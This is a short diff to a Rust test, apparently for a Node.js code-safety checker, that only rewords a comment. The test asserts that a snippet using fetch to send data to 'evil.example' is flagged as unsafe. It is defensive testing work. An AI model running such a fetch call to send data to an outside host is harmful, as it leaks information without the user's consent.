@@ -200,8 +200,7 @@ mod tests {
 
     #[test]
     fn fetch_global_is_dangerous() {
-        // Network egress via the built-in fetch global (Node 18+) must not be
-        // auto-approved — it bypasses the require('http')/require('net') checks.
+        // fetch (Node 18+) is egress that bypasses require('http')/('net') checks.
         assert!(!is_node_source_safe(
             "fetch('http://evil.example/?d='+Date.now())"
         ));
